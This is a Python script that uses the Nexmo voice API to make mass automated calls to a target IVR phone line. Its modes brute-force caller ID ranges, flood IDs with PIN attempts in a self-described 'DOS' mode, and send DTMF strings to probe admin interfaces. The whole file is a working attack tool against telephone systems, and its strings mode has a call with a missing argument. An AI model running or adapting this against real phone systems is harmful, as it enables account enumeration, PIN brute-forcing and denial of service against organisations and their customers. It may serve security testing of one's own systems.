import argparse
import sys
import urllib.parse
from copy import deepcopy
from pprint import pprint

import nexmo

client = nexmo.Client(application_id='PUT APPLICATION ID HERE',
                      private_key='PUT PRIVATE KEY DIRECTORY HERE', )


def parse_args():
    parser = argparse.ArgumentParser(epilog='Example: python ' + sys.argv[
        0] + ' -p 1672456824 -t enum -a http://api_server.com/ -enumidstart 555555555 -enumidend 666666666')
    parser.add_argument('-phone', "-p", help="target IVR phone number")
    parser.add_argument('-t', help="Choose the test type. id enumeration, dos versus a supplied id, or strings",
                        choices=['enum', 'dos', 'strings'], default='id', nargs='?')
    parser.add_argument('-a', "-api", help="your API server address, to communicate with nexmo's API server")
    parser.add_argument("-enumidstart", help="the ID to start from")
    parser.add_argument("-enumidend", help="the last ID in the range")
    parser.add_argument("-dospins",
                        help="the pins to send in the conversation, seperated by a comma, for example 123456,123154,123123")
    parser.add_argument("-strings", help="The DTMF strings to send in the conversation, for example abcdpp*123")
    return parser.parse_args()


def call_this(ncco, personal_id):
    calledncco = deepcopy(ncco) #had to use deepcopy to copy the type of ncco (dict list)
    calledncco["answer_url"] = [calledncco["answer_url"][0] + str(personal_id)]
    response = client.create_call(calledncco)
    pprint("sending call for id " + str(personal_id))


def call_creation_strings(ncco,strings_to_send):
    response = client.create_call(ncco)
    pprint("sending call for these strings " + str(strings_to_send))


def build_first_ncco(phonenumber, apiendpoint):
    ncco = {'to': [{'type': 'phone', 'number': str(phonenumber)}], 'from': {'type': 'phone', 'number': '972541234567'},
            "answer_url": [str(apiendpoint)], 'length_timer': 50}
    return ncco


def iterate_on_ids(ncco, start_id, end_id):
    for x in range(int(start_id), int(end_id)):
        call_this(ncco, x)


def main():
    chosenArgs = parse_args()
    ncco = build_first_ncco(chosenArgs.phone, chosenArgs.a)
    if (chosenArgs.t == "enum"):
        pprint('You chose ID enumeration bruteforcing by range - enumidstart is the range start, enumidend is the end')
        ncco["answer_url"] = [ncco["answer_url"][0] + "answering/"]
        iterate_on_ids(ncco, int(chosenArgs.enumidstart), int(chosenArgs.enumidend))
        pprint("Finished calling enumeration on all provided IDs")
    if (chosenArgs.t == "dos"):
        pprint("You chose DOSing IDs with PINs seperated by a comma")
        ncco["answer_url"] = [ncco["answer_url"][0] + "answering-dos/" + str(chosenArgs.dospins)+"/"]
        iterate_on_ids(ncco, int(chosenArgs.enumidstart), int(chosenArgs.enumidend))
        pprint("Finished sending PINs for all IDs")
    if (chosenArgs.t == "strings"):
        pprint("You chose sending strings to enumerate admin interfaces and cause weird behaviors")
        ncco["answer_url"] = [ncco["answer_url"][0] + "answering_strings/"+str(chosenArgs.strings)]
        call_creation_strings(urllib.parse.quote(chosenArgs.strings))


if __name__ == "__main__":
    main()
